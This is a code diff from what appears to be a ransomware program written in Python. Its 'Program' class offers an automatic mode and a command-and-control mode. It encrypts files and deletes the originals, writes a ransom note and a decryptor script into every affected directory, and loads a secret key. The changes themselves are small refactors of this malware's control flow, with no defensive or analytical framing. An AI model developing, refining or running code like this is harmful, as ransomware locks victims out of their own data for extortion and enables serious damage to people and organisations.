@@ -61,7 +61,6 @@ class Program():
         match self.__mode__:
             case "auto":
                 print("Auto mode selected. The program will run without user interaction.")
-                self.__should_cli_run = False
                 self.__auto_mode()
             case "c2":
                 print("C2 mode selected. The program will attempt to connect to a command and control server.")
@@ -147,13 +146,6 @@ class Program():
         with open("decrypt.py", "r") as decryptor_file:
             script_content = decryptor_file.read()
 
-
-        # if self.__system__ == "Windows":
-        #     import sys
-        #     current_dir = os.path.dirname(os.path.abspath(__file__))
-        #     print("Adding " + current_dir + " to sys.path")
-        #     sys.path.append(current_dir)
-
         for dir in self.__directories_with_files:
             self.__create_ransomnote_file(dir, content)
             self.__create_decryptor_file(dir, script_content)
@@ -216,15 +208,6 @@ class Program():
             sys.path.remove(cwd)
             
     def __test_function(self, path):
-        cwd = os.getcwd()
-
-        # with open("decrypt.py", "r") as decryptor_file:
-        #     script_content = decryptor_file.read()
-
-        # content = content.replace("#added_line_script", f'os.chdir(r\"{cwd.replace("\\", "/")}\")')
-        
-        # with open(path, "w") as decryptor_file:
-        #     decryptor_file.write(content)
 
         import sys
         print(sys.path)
@@ -296,11 +279,12 @@ class Program():
         self.__setup(should_encrypt=True, should_delete_original=True)
         self.__encrypt()
         self.__ransomnote()
+        self.__should_cli_run = False
 
     def load_key(self, key_filename: str = "secret.key"):
         if self.__criptography is None:
             self.__criptography = CryptoGraphy(should_encrypt=True, should_delete_original=True)
-        self.__criptography.load_key(key_filename)
+        return self.__criptography.load_key(key_filename)
 
 if __name__ == "__main__":
     program = Program()
